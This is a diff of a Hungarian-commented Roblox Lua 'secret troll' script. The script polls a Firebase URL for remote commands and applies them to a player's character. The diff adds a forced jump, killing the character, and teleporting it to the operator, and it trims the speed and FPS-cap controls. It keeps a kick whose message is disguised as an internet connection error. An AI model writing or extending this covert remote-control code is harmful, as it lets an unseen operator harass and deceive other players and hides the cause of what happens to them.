@@ -1,5 +1,6 @@
--- [[ TITKOS TROLL EGYSÉG - LÁTHATATLAN ]]
+-- [[ FRISSÍTETT TITKOS TROLL EGYSÉG - RESP & TP & JUMP FIX ]]
 local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/.json"
+local myName = "A_TE_FELHASZNÁLÓNEVED" -- IDE ÍRD BE A SAJÁT ROBLOX NEVEDET!
 
 task.spawn(function()
     local lastT = 0
@@ -14,33 +15,35 @@ task.spawn(function()
                 local char = p.Character
                 local hum = char and char:FindFirstChild("Humanoid")
                 local root = char and char:FindFirstChild("HumanoidRootPart")
+                
                 if hum and root then
-                    -- LÖKÉSEK / UGRÁS
+                    -- LÖKÉSEK
                     if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 12))
                     elseif data.cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 12))
-                    elseif data.cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 12))
-                    elseif data.cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 12))
-                    elseif data.cmd == "jump" then hum.Jump = true hum:ChangeState(1)
                     
-                    -- FPS LIMITEK
+                    -- JUMP FIX (NAGY UGRÁS)
+                    elseif data.cmd == "jump" then 
+                        hum.JumpPower = 100
+                        hum.Jump = true
+                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
+                    
+                    -- RESPAWN (KARAKTER ÖLÉS)
+                    elseif data.cmd == "respawn" then 
+                        hum.Health = 0
+                        
+                    -- TELEPORT HOZZÁD
+                    elseif data.cmd == "tp" then
+                        local target = game.Players:FindFirstChild(myName)
+                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                            root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        end
+
+                    -- FPS & SPEED (maradt a régi)
                     elseif data.cmd == "fps10" then setfpscap(10)
-                    elseif data.cmd == "fps20" then setfpscap(20)
-                    elseif data.cmd == "fps30" then setfpscap(30)
-                    elseif data.cmd == "fps40" then setfpscap(40)
-                    elseif data.cmd == "fps50" then setfpscap(50)
-                    elseif data.cmd == "fps60" then setfpscap(60)
-                    elseif data.cmd == "fpsmax" then setfpscap(0) -- 0 = Uncapped / Max FPS
-                    
-                    -- SEBESSÉG IRÁNYÍTÁS TÁVOLRÓL
-                    elseif data.cmd == "speed0" then hum.WalkSpeed = 0     -- Lefagyasztás
-                    elseif data.cmd == "speed16" then hum.WalkSpeed = 16   -- Normál sebesség
-                    elseif data.cmd == "speed50" then hum.WalkSpeed = 50   -- Gyors
-                    elseif data.cmd == "speed100" then hum.WalkSpeed = 100 -- Nagyon gyors
-                    elseif data.cmd == "speed500" then hum.WalkSpeed = 500 -- Flash
-                    
-                    -- KICK
-                    elseif data.cmd == "kick" then 
-                        p:Kick("Please check your internet connection and try again.\n(Error Code: 277)")
+                    elseif data.cmd == "fpsmax" then setfpscap(0)
+                    elseif data.cmd == "speed0" then hum.WalkSpeed = 0
+                    elseif data.cmd == "speed16" then hum.WalkSpeed = 16
+                    elseif data.cmd == "kick" then p:Kick("Please check your internet connection and try again.\n(Error Code: 277)")
                     end
                 end
             end
